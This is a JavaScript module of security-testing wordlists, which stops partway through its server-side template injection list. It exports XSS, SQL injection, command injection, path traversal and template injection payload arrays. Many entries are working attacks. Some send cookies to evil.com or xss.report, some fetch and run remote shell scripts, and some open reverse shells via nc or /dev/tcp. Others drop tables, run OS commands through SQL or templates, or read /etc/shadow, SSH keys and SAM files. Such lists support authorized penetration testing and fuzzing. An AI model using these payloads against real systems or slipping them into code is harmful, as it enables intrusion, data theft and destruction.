/**
 * =============================================================================
 * DARKNODE SECURITY WORDLISTS - MEGA REFERENCE - PART 4: PAYLOADS & FUZZING
 * =============================================================================
 *
 * Copyright 2024-2026 Darknode Project
 * All rights reserved.
 *
 * *** FOR AUTHORIZED PENETRATION TESTING ONLY ***
 * Using these payloads against systems without explicit written permission
 * is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent
 * international legislation. Always obtain written authorization before
 * conducting any security testing.
 *
 * Sources: OWASP, PortSwigger, PayloadsAllTheThings, HackTricks,
 * SecLists, public security research, vendor documentation.
 *
 * The authors assume no liability for misuse of this data.
 *
 * FOR AUTHORIZED TESTING ONLY.
 * =============================================================================
 */

// =============================================================================
// XSS_PAYLOADS
// =============================================================================
// Cross-Site Scripting test payloads — reflected, stored, DOM-based, and
// filter-evasion variants. ~200 entries.
// =============================================================================

export const XSS_PAYLOADS = [
  // --- Basic script tags ---
  '<script>alert(1)</script>',
  '<script>alert("XSS")</script>',
  '<script>alert(String.fromCharCode(88,83,83))</script>',
  '<script>alert(document.cookie)</script>',
  '<script>alert(document.domain)</script>',
  '<script>confirm(1)</script>',
  '<script>prompt(1)</script>',
  '<script src=//evil.com/xss.js></script>',
  '<script>new Image().src="//evil.com/?c="+document.cookie</script>',
  '<script>fetch("//evil.com/?c="+document.cookie)</script>',

  // --- img tag ---
  '<img src=x onerror=alert(1)>',
  '<img src=x onerror=alert("XSS")>',
  '<img/src=x onerror=alert(1)>',
  '<img src=x onerror=confirm(1)>',
  '<img src=x onerror=prompt(1)>',
  '<img src=x onerror=alert(document.cookie)>',
  '<img src=x onerror=alert`1`>',
  '<img src=1 onerror=alert(1)//',
  '<img """><script>alert(1)</script>">',
  '<img src=x:alert(1) onerror=eval(src)>',

  // --- svg tag ---
  '<svg onload=alert(1)>',
  '<svg/onload=alert(1)>',
  '<svg onload=alert("XSS")>',
  '<svg/onload=alert(document.cookie)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><animate onbegin=alert(1) attributeName=x>',
  '<svg><set onbegin=alert(1) attributeName=x>',
  '<svg><animateTransform onbegin=alert(1) attributeName=x>',
  '<svg><a><rect width=100 height=100 /><animate attributeName=href to=javascript:alert(1)>',
  '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(1) /></svg>#x">',

  // --- Context breaking ---
  '"><script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  "'><script>alert(1)</script>",
  "'>"><img src=x onerror=alert(1)>",
  '</script><script>alert(1)</script>',
  '</title><script>alert(1)</script>',
  '</textarea><script>alert(1)</script>',
  '</style><script>alert(1)</script>',
  '</noscript><script>alert(1)</script>',
  '--><script>alert(1)</script>',
  '*/alert(1)/*',
  '*/</script><script>alert(1)</script>/*',

  // --- Event handlers ---
  '<body onload=alert(1)>',
  '<body onpageshow=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<input onblur=alert(1) autofocus><input autofocus>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>',
  '<marquee onstart=alert(1)>',
  '<video src=x onerror=alert(1)>',
  '<video><source onerror=alert(1)>',
  '<audio src=x onerror=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<div onmouseover=alert(1)>hover</div>',
  '<div onmouseenter=alert(1)>enter</div>',
  '<div onwheel=alert(1)>scroll</div>',
  '<div oncontextmenu=alert(1)>right-click</div>',
  '<div ondblclick=alert(1)>doubleclick</div>',
  '<div ondrag=alert(1) draggable=true>drag</div>',
  '<div oncopy=alert(1)>copy</div>',
  '<div oncut=alert(1)>cut</div>',
  '<div onpaste=alert(1)>paste</div>',
  '<a href="#" onclick=alert(1)>click</a>',

  // --- iframe ---
  '<iframe src="javascript:alert(1)">',
  '<iframe src=javascript:alert(1)>',
  '<iframe/src=javascript:alert(1)>',
  '<iframe srcdoc="<script>alert(1)</script>">',
  '<iframe src="data:text/html,<script>alert(1)</script>">',
  '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',

  // --- object/embed ---
  '<object data="javascript:alert(1)">',
  '<embed src="javascript:alert(1)">',
  '<object data="data:text/html,<script>alert(1)</script>">',

  // --- a href javascript ---
  '<a href="javascript:alert(1)">click</a>',
  '<a href="javascript:alert(document.cookie)">click</a>',
  '<a href=javascript:alert(1)>click</a>',
  '<a href="javas\tcript:alert(1)">click</a>',
  '<a href="javas&#x09;cript:alert(1)">click</a>',
  '<a href="javas&#x0A;cript:alert(1)">click</a>',
  '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>',

  // --- Encoding evasion ---
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<scr\\x00ipt>alert(1)</scr\\x00ipt>',
  '<IMG SRC=javascript:alert(1)>',
  '<IMG SRC=JaVaScRiPt:alert(1)>',
  '<IMG SRC=`javascript:alert(1)`>',
  '<IMG SRC="jav&#x09;ascript:alert(1);">',
  '<IMG SRC="jav&#x0A;ascript:alert(1);">',
  '<IMG SRC="jav&#x0D;ascript:alert(1);">',
  '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
  '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
  '<img src=x onerror=\\u0061lert(1)>',
  '<img src=x onerror=al\\u0065rt(1)>',
  '<img src=x onerror=&#x61;lert(1)>',
  '<img src=x onerror=&#97;lert(1)>',
  '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
  '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',

  // --- Template literals ---
  '${alert(1)}',
  '{{constructor.constructor("alert(1)")()}}',
  '{{7*7}}',
  '${7*7}',
  '<img src=x onerror=alert`1`>',

  // --- DOM-based ---
  'javascript:alert(document.domain)',
  '#<script>alert(1)</script>',
  '#"><img src=x onerror=alert(1)>',
  'data:text/html,<script>alert(1)</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',

  // --- Double encoding ---
  '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
  '%3Cscript%3Ealert(1)%3C/script%3E',
  '&lt;script&gt;alert(1)&lt;/script&gt;',

  // --- Mutation XSS (mXSS) ---
  '<listing><img src=1 onerror=alert(1)>',
  '<noembed><img src=x onerror=alert(1)></noembed>',
  '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
  '<form><math><mtext><form><mglyph><style></math><img src onerror=alert(1)>',

  // --- Polyglots ---
  'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
  '\'"-->]]>*/</script></style></title></textarea><img src=x onerror=alert(1)>',
  '"><svg/onload=alert(1)//',
  '\'-alert(1)-\'',
  '"-alert(1)-"',
  '</ScRiPt><ScRiPt>alert(1)</ScRiPt>',

  // --- CSP bypass attempts ---
  '<base href=//evil.com/>',
  '<link rel=import href=//evil.com/xss.html>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<form action=javascript:alert(1)><input type=submit>',
  '<isindex action=javascript:alert(1) type=submit value=XSS>',

  // --- Less common tags ---
  '<xss onclick=alert(1)>click</xss>',
  '<x contenteditable onblur=alert(1)>lose focus</x>',
  '<menu id=x contextmenu=x onshow=alert(1)>right-click</menu>',
  '<keygen onfocus=alert(1) autofocus>',
  '<math><mi//teleportation=alert(1) xmlns="http://www.w3.org/1998/Math/MathML">',

  // --- Payload with WAF bypass ---
  '<Img Src=Xx OnError=alert(1)>',
  '<IMG onmouseover="alert(1)" src=x>',
  '<img src onerror=ale\\u0072t(1)>',
  '<d3v/oNmouseover=["confirm`1`"]>z',
  '"><details/open/ontoggle=confirm`1`>',
  '<w contenteditable id=x onfocusin=alert(1)>',

  // --- Blind XSS ---
  '"><script src=//xss.report/s/payload.js></script>',
  '<img src=x onerror="var i=new Image();i.src=\'//xss.report/?c=\'+document.cookie;">',
  '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9zL3BheWxvYWQuanMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>',

  // --- Obfuscated ---
  '<svg><script>alert&#40;1&#41;</script>',
  '<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>',
  '<svg><script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>',
  '<img src=x onerror="window[`al`+`ert`](1)">',
  '<img src=x onerror="top[`al`+`ert`](1)">',
  '<img src=x onerror="self[`al`+`ert`](1)">',
  '<img src=x onerror="this[`al`+`ert`](1)">',
  '<img src=x onerror="globalThis[`al`+`ert`](1)">',
  '<img src=x onerror=[].constructor.constructor`alert\\x281\\x29```>',
  '<img src=x onerror=Function`alert\\x281\\x29```>',

  // --- Exotic vectors ---
  '"><svg><desc><template><svg onload=alert(1)>',
  '<template><img src=x onerror=alert(1)></template>',
  '<foreignObject><body onload=alert(1)></foreignObject>',
  '<table background="javascript:alert(1)">',
  '<input type=image src=x onerror=alert(1)>',
  '<isindex type=image src=x onerror=alert(1)>',
  '<video poster=javascript:alert(1)//',
  '<button formaction=javascript:alert(1)>click</button>',
  '<math href="javascript:alert(1)">click</math>',
  '<brute contenteditable onblur=alert(1)>click away</brute>',
];


// =============================================================================
// SQLI_PAYLOADS
// =============================================================================
// SQL injection test payloads — union, boolean blind, time-based blind,
// error-based, stacked queries, and DBMS-specific variants. ~200 entries.
// =============================================================================

export const SQLI_PAYLOADS = [
  // --- Basic detection ---
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' #",
  "' OR '1'='1'/*",
  '" OR "1"="1',
  '" OR "1"="1" --',
  "' OR 1=1 --",
  "' OR 1=1 #",
  '" OR 1=1 --',
  "admin' --",
  "admin'#",
  "' OR ''='",
  "' OR 'x'='x",
  "1' OR '1'='1",
  "1 OR 1=1",
  "1' OR '1'='1' --",
  "' OR 1=1--",
  "' OR 1=1;--",
  "') OR ('1'='1",
  "') OR ('1'='1' --",

  // --- Union-based ---
  "' UNION SELECT NULL --",
  "' UNION SELECT NULL,NULL --",
  "' UNION SELECT NULL,NULL,NULL --",
  "' UNION SELECT NULL,NULL,NULL,NULL --",
  "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
  "' UNION SELECT 1,2,3 --",
  "' UNION SELECT 1,2,3,4 --",
  "' UNION SELECT 1,2,3,4,5 --",
  "' UNION SELECT username,password FROM users --",
  "' UNION SELECT table_name,NULL FROM information_schema.tables --",
  "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --",
  "' UNION ALL SELECT NULL --",
  "' UNION ALL SELECT NULL,NULL --",
  "' UNION ALL SELECT 1,@@version --",
  "' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() --",
  "' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' --",
  "' UNION SELECT 1,CONCAT(username,0x3a,password) FROM users --",
  "0 UNION SELECT 1,2,3 --",
  "-1 UNION SELECT 1,2,3 --",
  "1 UNION SELECT ALL FROM information_schema AND ' or SLEEP(5) or '",

  // --- Boolean blind ---
  "' AND 1=1 --",
  "' AND 1=2 --",
  "' AND 'a'='a",
  "' AND 'a'='b",
  "' AND (SELECT COUNT(*) FROM users) > 0 --",
  "' AND (SELECT LENGTH(database())) > 0 --",
  "' AND (SELECT SUBSTRING(database(),1,1))='a' --",
  "' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 64 --",
  "' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 96 --",
  "' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))) > 64 --",
  "1 AND 1=1",
  "1 AND 1=2",
  "1' AND 1=1 AND '1'='1",
  "1' AND 1=2 AND '1'='1",
  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",

  // --- Time-based blind ---
  "' AND SLEEP(5) --",
  "' AND SLEEP(5)#",
  "'; WAITFOR DELAY '0:0:5' --",
  "' AND (SELECT SLEEP(5)) --",
  "1' AND SLEEP(5) AND '1'='1",
  "' OR SLEEP(5) --",
  "' AND IF(1=1,SLEEP(5),0) --",
  "' AND IF(1=2,SLEEP(5),0) --",
  "' AND (SELECT IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)) --",
  "' AND BENCHMARK(10000000,SHA1('test')) --",
  "1; WAITFOR DELAY '0:0:5' --",
  "'; SELECT pg_sleep(5) --",
  "' || pg_sleep(5) --",
  "1 AND (SELECT 1 FROM pg_sleep(5))",
  "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --",

  // --- Error-based ---
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e)) --",
  "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1) --",
  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
  "' AND EXP(~(SELECT * FROM (SELECT database())a)) --",
  "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1) --",
  "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT database()),0x7e)) USING utf8))) --",
  "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a) --",
  "' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT database())a)b)) --",
  "' AND MULTIPOINT((SELECT * FROM (SELECT * FROM (SELECT database())a)b)) --",
  "' AND ROW(1,1) > (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x) --",

  // --- Stacked queries ---
  "'; DROP TABLE users --",
  "'; INSERT INTO users VALUES('hacker','hacked') --",
  "'; UPDATE users SET password='hacked' WHERE username='admin' --",
  "'; CREATE TABLE test(id INT) --",
  "1; SELECT * FROM users --",
  "'; EXEC xp_cmdshell('whoami') --",
  "'; EXEC master..xp_cmdshell 'ping evil.com' --",

  // --- Comment variants ---
  "' --",
  "' #",
  "' /*",
  "' -- -",
  "'; --",
  "'; #",
  "') --",
  "') #",
  "')) --",

  // --- MySQL specific ---
  "' AND @@version --",
  "' AND database() --",
  "' AND user() --",
  "' AND (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata) --",
  "' AND LOAD_FILE('/etc/passwd') --",
  "' INTO OUTFILE '/tmp/test.txt' --",
  "' INTO DUMPFILE '/tmp/test.txt' --",
  "' AND (SELECT * FROM mysql.user) --",

  // --- PostgreSQL specific ---
  "' AND version() --",
  "' AND current_database() --",
  "' AND current_user --",
  "'; COPY (SELECT '') TO PROGRAM 'id' --",
  "' AND (SELECT string_agg(datname,',') FROM pg_database) --",
  "' AND (SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') --",
  "'; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'id'; SELECT * FROM cmd_output --",

  // --- MSSQL specific ---
  "' AND @@version --",
  "' AND DB_NAME() --",
  "' AND SYSTEM_USER --",
  "'; EXEC xp_cmdshell('dir') --",
  "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE --",
  "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE --",
  "' AND (SELECT name FROM master..sysdatabases FOR XML PATH('')) --",
  "' AND (SELECT name FROM sysobjects WHERE xtype='U' FOR XML PATH('')) --",
  "'; DECLARE @q varchar(200); SET @q='\\\\evil.com\\share\\output'; EXEC master..xp_dirtree @q --",

  // --- Oracle specific ---
  "' AND (SELECT banner FROM v$version WHERE ROWNUM=1) IS NOT NULL --",
  "' AND (SELECT user FROM dual) IS NOT NULL --",
  "' AND UTL_HTTP.REQUEST('http://evil.com/'||(SELECT user FROM dual)) IS NOT NULL --",
  "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NOT NULL --",
  "' AND (SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner=USER) IS NOT NULL --",
  "' UNION SELECT NULL FROM dual --",
  "' UNION SELECT banner FROM v$version --",

  // --- SQLite specific ---
  "' AND sqlite_version() --",
  "' UNION SELECT sql FROM sqlite_master --",
  "' UNION SELECT name FROM sqlite_master WHERE type='table' --",
  "' UNION SELECT tbl_name FROM sqlite_master --",
  "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) --",

  // --- WAF bypass ---
  "' /*!50000OR*/ 1=1 --",
  "' /*!UNION*/ /*!SELECT*/ 1,2,3 --",
  "' %55nion %53elect 1,2,3 --",
  "' uNiOn sElEcT 1,2,3 --",
  "' UNION%20SELECT 1,2,3 --",
  "' UNION%0ASELECT 1,2,3 --",
  "' UNION%0DSELECT 1,2,3 --",
  "' UNION%09SELECT 1,2,3 --",
  "' UN/**/ION SE/**/LECT 1,2,3 --",
  "' /*!12345UNION*//*!12345SELECT*/ 1,2,3 --",
  "' %2f%2a*/UNION%2f%2a*/SELECT 1,2,3 --",
  "' AND%201=1 --",
  "' AND/**/ 1=1 --",
  "0x27 OR 1=1",
  "' %26%26 1=1 --",
  "' %7C%7C 1=1 --",
  "' && 1=1 --",
  "' || 1=1 --",

  // --- Second-order & stored ---
  "admin'-- ",
  "admin'/*",
  "' UNION SELECT 1,2,3 INTO @a --",
  "'; SET @q = 0x41414141; PREPARE stmt FROM @q; EXECUTE stmt --",

  // --- Numeric / no-quote ---
  "1 OR 1=1",
  "1 AND 1=1",
  "1 AND 1=2",
  "1 UNION SELECT 1,2,3",
  "1 ORDER BY 1 --",
  "1 ORDER BY 100 --",
  "1 HAVING 1=1 --",
  "1 GROUP BY 1 --",
];


// =============================================================================
// COMMAND_INJECTION
// =============================================================================
// OS command injection payloads — semicolons, pipes, backticks, $(),
// newlines, and encoding variants. ~100 entries.
// =============================================================================

export const COMMAND_INJECTION = [
  // --- Semicolon ---
  '; id',
  '; whoami',
  '; uname -a',
  '; cat /etc/passwd',
  '; ls -la',
  '; ls -la /',
  '; cat /etc/shadow',
  '; ifconfig',
  '; ip addr',
  '; hostname',
  '; pwd',
  '; env',
  '; set',
  '; netstat -an',
  '; ps aux',

  // --- Pipe ---
  '| id',
  '| whoami',
  '| uname -a',
  '| cat /etc/passwd',
  '| ls -la',
  '| hostname',
  '| ifconfig',

  // --- Double pipe / ampersand ---
  '|| id',
  '|| whoami',
  '|| cat /etc/passwd',
  '&& id',
  '&& whoami',
  '&& cat /etc/passwd',
  '& id',
  '& whoami',
  '& cat /etc/passwd',

  // --- Backticks ---
  '`id`',
  '`whoami`',
  '`uname -a`',
  '`cat /etc/passwd`',
  '`ls`',
  '`hostname`',

  // --- $() substitution ---
  '$(id)',
  '$(whoami)',
  '$(uname -a)',
  '$(cat /etc/passwd)',
  '$(ls)',
  '$(hostname)',
  '$(curl evil.com)',
  '$(wget evil.com)',

  // --- Newline ---
  '%0aid',
  '%0awhoami',
  '%0acat /etc/passwd',
  '%0d%0aid',
  '%0d%0awhoami',
  '\\nid',
  '\\nwhoami',
  '\\n/bin/cat /etc/passwd',

  // --- Null byte ---
  '%00; id',
  '%00| whoami',
  'test%00; cat /etc/passwd',

  // --- Windows variants ---
  '& dir',
  '| dir',
  '; dir',
  '&& dir',
  '|| dir',
  '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
  '| type C:\\boot.ini',
  '& whoami',
  '| net user',
  '& ipconfig /all',
  '& systeminfo',
  '| tasklist',
  '& net localgroup administrators',
  '& powershell -c "Get-Process"',

  // --- Chained and complex ---
  '; sleep 5',
  '| sleep 5',
  '& ping -c 5 127.0.0.1',
  '; ping -n 5 127.0.0.1',
  '$(sleep 5)',
  '`sleep 5`',
  '; echo vulnerable > /tmp/pwned',
  '; curl http://evil.com/shell.sh | sh',
  '; wget http://evil.com/shell.sh -O /tmp/s.sh && sh /tmp/s.sh',
  '| nc -e /bin/sh evil.com 4444',
  '; bash -i >& /dev/tcp/evil.com/4444 0>&1',
  '; python -c "import os;os.system(\'id\')"',
  '; perl -e "system(\'id\')"',
  '; ruby -e "system(\'id\')"',

  // --- Filter bypass ---
  ";${IFS}id",
  ";{id}",
  ";$IFS/bin/id",
  ";cat${IFS}/etc/passwd",
  ";\tcat\t/etc/passwd",
  'w$(echo "h")oami',
  '/???/??t /???/p??s??',
  "/bin/c'a't /etc/passwd",
  '/bin/c"a"t /etc/passwd',
  "/bin/ca\\t /etc/passwd",
  "i{d}",
  "c'a't /etc/passwd",
  "c\"a\"t /etc/passwd",
  "c\\at /etc/passwd",
  "wh$()oami",
];


// =============================================================================
// PATH_TRAVERSAL
// =============================================================================
// Directory / path traversal payloads — dot-dot-slash sequences, encoding
// variants, OS-specific paths. ~100 entries.
// =============================================================================

export const PATH_TRAVERSAL = [
  // --- Basic Linux ---
  '../../../etc/passwd',
  '../../../../etc/passwd',
  '../../../../../etc/passwd',
  '../../../../../../etc/passwd',
  '../../../../../../../etc/passwd',
  '../../../../../../../../etc/passwd',
  '../../../etc/shadow',
  '../../../etc/hosts',
  '../../../etc/hostname',
  '../../../etc/issue',
  '../../../etc/motd',
  '../../../etc/resolv.conf',
  '../../../proc/self/environ',
  '../../../proc/self/cmdline',
  '../../../proc/self/status',
  '../../../proc/version',
  '../../../proc/net/tcp',
  '../../../var/log/auth.log',
  '../../../var/log/syslog',
  '../../../root/.bash_history',
  '../../../root/.ssh/id_rsa',
  '../../../root/.ssh/authorized_keys',
  '../../../home/user/.bash_history',

  // --- Basic Windows ---
  '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
  '..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
  '..\\..\\..\\boot.ini',
  '..\\..\\..\\..\\boot.ini',
  '..\\..\\..\\Windows\\win.ini',
  '..\\..\\..\\Windows\\System32\\config\\SAM',
  '..\\..\\..\\Windows\\System32\\config\\SYSTEM',
  '..\\..\\..\\Windows\\System32\\config\\SOFTWARE',
  '..\\..\\..\\Windows\\repair\\SAM',
  '..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\',

  // --- URL encoding ---
  '..%2f..%2f..%2fetc%2fpasswd',
  '..%2f..%2f..%2f..%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
  '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
  '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%255c..%255c..%255cWindows%255cSystem32%255cdrivers%255cetc%255chosts',

  // --- Double encoding ---
  '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
  '%252e%252e/%252e%252e/%252e%252e/etc/passwd',
  '..%25252f..%25252f..%25252fetc%25252fpasswd',

  // --- Unicode / overlong UTF-8 ---
  '..%c0%ae..%c0%ae..%c0%aeetc%c0%aepasswd',
  '%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd',
  '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',

  // --- Null byte (legacy PHP <5.3.4) ---
  '../../../etc/passwd%00',
  '../../../etc/passwd%00.jpg',
  '../../../etc/passwd%00.html',
  '../../../etc/passwd%00.png',
  '../../../etc/passwd\\0',
  '../../../etc/passwd\\0.txt',

  // --- Dot stripping bypass ---
  '....//....//....//etc/passwd',
  '....\\\\....\\\\....\\\\etc\\passwd',
  '..../....//....//etc/passwd',
  '..././..././..././etc/passwd',

  // --- Mixed separators ---
  '..\\../..\\../etc/passwd',
  '../..\\../..\\etc/passwd',
  '..\\..\\..\\etc/passwd',

  // --- Absolute path ---
  '/etc/passwd',
  '/etc/shadow',
  '/etc/hosts',
  '/proc/self/environ',
  '/proc/self/fd/0',
  '/proc/self/fd/1',
  '/proc/self/fd/2',
  'C:\\Windows\\System32\\drivers\\etc\\hosts',
  'C:\\boot.ini',
  'C:\\Windows\\win.ini',
  '/var/log/apache2/access.log',
  '/var/log/nginx/access.log',
  '/var/log/httpd/access_log',

  // --- Web server config files ---
  '../../../etc/apache2/apache2.conf',
  '../../../etc/nginx/nginx.conf',
  '../../../etc/httpd/conf/httpd.conf',
  '../../../usr/local/apache2/conf/httpd.conf',
  '../../../etc/php/7.4/apache2/php.ini',
  '../../../etc/mysql/my.cnf',
  '../../../etc/postgresql/pg_hba.conf',

  // --- Common application files ---
  '../../../var/www/html/.htaccess',
  '../../../var/www/html/wp-config.php',
  '../../../var/www/html/config.php',
  '../../../var/www/html/.env',
  '../../../opt/tomcat/conf/server.xml',
  '../../../opt/tomcat/conf/tomcat-users.xml',

  // --- Java-specific ---
  '../../../WEB-INF/web.xml',
  '../../../WEB-INF/classes/application.properties',
  '../../../META-INF/MANIFEST.MF',

  // --- Wrapper / scheme ---
  'file:///etc/passwd',
  'file:///C:/Windows/win.ini',
  'php://filter/convert.base64-encode/resource=../../../etc/passwd',
  'php://filter/read=string.rot13/resource=../../../etc/passwd',
  'php://input',
  'expect://id',
  'zip://uploads/shell.jpg#shell.php',
];


// =============================================================================
// SSTI_PAYLOADS
// =============================================================================
// Server-Side Template Injection payloads for Jinja2, Twig, Freemarker,
// Velocity, Mako, Smarty, Pebble, Thymeleaf, ERB, and Tornado. ~80 entries.
// =============================================================================

export const SSTI_PAYLOADS = [
  // --- Detection / polyglot ---
  '{{7*7}}',
  '${7*7}',
  '<%= 7*7 %>',
  '#{7*7}',
  '*{7*7}',
  '{7*7}',
  '{{7*\'7\'}}',
  '${7*\'7\'}',
  '{{dump(app)}}',
  '{{config}}',
  '{{self}}',
  '{{request}}',
  '{{settings.SECRET_KEY}}',
  '${{7*7}}',
  '#{T(java.lang.Runtime).getRuntime()}',

  // --- Jinja2 (Python / Flask) ---
  '{{config.items()}}',
  '{{request.application.__self__._get_data_for_json.__globals__}}',
  '{{"".__class__.__mro__[1].__subclasses__()}}',
  '{{"".__class__.__bases__[0].__subclasses__()}}',
  '{{().__class__.__bases__[0].__subclasses__()}}',
  '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
  '{%for x in ().__class__.__bases__[0].__subclasses__()%}{%if "warning" in x.__name__%}{{x()._module.__builtins__["__import__"]("os").popen("id").read()}}{%endif%}{%endfor%}',
  '{{lipsum.__globals__["os"].popen("id").read()}}',
  '{{cycler.__init__.__globals__.os.popen("id").read()}}',
  '{{joiner.__init__.__globals__.os.popen("id").read()}}',
  '{{namespace.__init__.__globals__.os.popen("id").read()}}',
  '{{request.__class__.__mro__[1].__subclasses__()}}',
  '{{url_for.__globals__}}',
  '{{get_flashed_messages.__globals__}}',
  '{{"".__class__.__mro__[2].__subclasses__()}}',

  // --- Twig (PHP) ---
  '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
  '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
  '{{["id"]|filter("system")}}',
  '{{["id"]|map("system")}}',
  '{{["id"]|filter("exec")}}',
  '{{["id",""]|sort("system")}}',
  '{{app.request.server.all|join(",")}}',
  '{{_self.env.display("id")}}',
  '{{"/etc/passwd"|file_excerpt(1,30)}}',

  // --- Freemarker (Java) ---
  '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
  '${ex("id")}',
  '<#assign classloader=object?api.class.protectionDomain.classLoader>',
  '${product.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(null,"id")}',
  '[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}',
  '<#assign is=object?api.class.forName("java.lang.ProcessBuilder")?api.getDeclaredConstructors()[0].newInstance(["id"])?api.start()>',

  // --- Velocity (Java) ---
  '#set($x="")##',
  '#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
  '#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")',

  // --- Mako (Python) ---
  '${self.module.cache.util.os.popen("id").read()}',
  '<%import os;x=os.popen("id").read()%>${x}',
  '${self.module.cache.util.os.system("id")}',

  // --- Smarty (PHP) ---
  '{php}echo `id`;{/php}',
  '{system("id")}',
  '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system(\'id\');?>",self::clearConfig())}',
  '{if system("id")}{/if}',
  '{$smarty.version}',

  // --- Pebble (Java) ---
  '{% set cmd = "id" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName("java.lang.String").constructors[0].newInstance(bytes, "UTF-8") }}',

  // --- Thymeleaf (Java / Spring) ---
  '__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x',
  '__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\\\A").next()}__::.x',

  // --- ERB (Ruby) ---
  '<%= system("id") %>',
  '<%= `id` %>',
  '<%= IO.popen("id").read() %>',
  '<%= File.read("/etc/passwd") %>',
